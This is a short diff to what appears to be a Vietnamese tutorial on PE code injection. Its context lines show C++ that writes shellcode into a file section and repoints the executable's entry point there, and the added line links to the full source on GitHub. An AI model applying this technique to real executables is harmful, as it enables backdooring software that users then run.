@@ -372,3 +372,5 @@ DWORD jmpRVA = calculateJMPAdress(nextJMPAddress, oldOEP);
 memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData, shellCode, sizeof(shellCode));
 ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress;
 ```
+
+Source code đầy đủ [tại đây](https://github.com/0r3o-r3vEr5e/Chapter-2-Code-Injection/blob/main/inject.cpp)
